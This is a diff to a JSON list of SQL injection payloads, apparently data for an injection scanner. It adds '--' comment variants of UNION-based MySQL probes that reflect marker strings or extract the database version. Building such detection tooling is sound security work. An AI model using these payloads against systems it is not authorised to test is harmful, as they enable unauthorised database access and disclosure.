@@ -91,16 +91,33 @@
       "reflection": "abc"
     },
     {
+      "payload": "' UNION SELECT 'abc','def'--",
+      "type": "UNION-based (MySQL string reflection alt)",
+      "reflection": "abc"
+    },
+    {
       "payload": "' UNION SELECT @@version,NULL#",
       "type": "UNION-based (MySQL version extraction)"
+    },
+    {
+      "payload": "' UNION SELECT @@version,NULL--",
+      "type": "UNION-based (MySQL version extraction alt comment)"
     },
     {
       "payload": "' UNION SELECT NULL,@@version#",
       "type": "UNION-based (MySQL version extraction alt)"
     },
     {
+      "payload": "' UNION SELECT NULL,@@version--",
+      "type": "UNION-based (MySQL version extraction alt comment 2)"
+    },
+    {
       "payload": "' UNION SELECT version(),NULL#",
       "type": "UNION-based (MySQL version() function)"
+    },
+    {
+      "payload": "' UNION SELECT version(),NULL--",
+      "type": "UNION-based (MySQL version() function alt comment)"
     },
     {
       "payload": "' UNION SELECT NULL--",
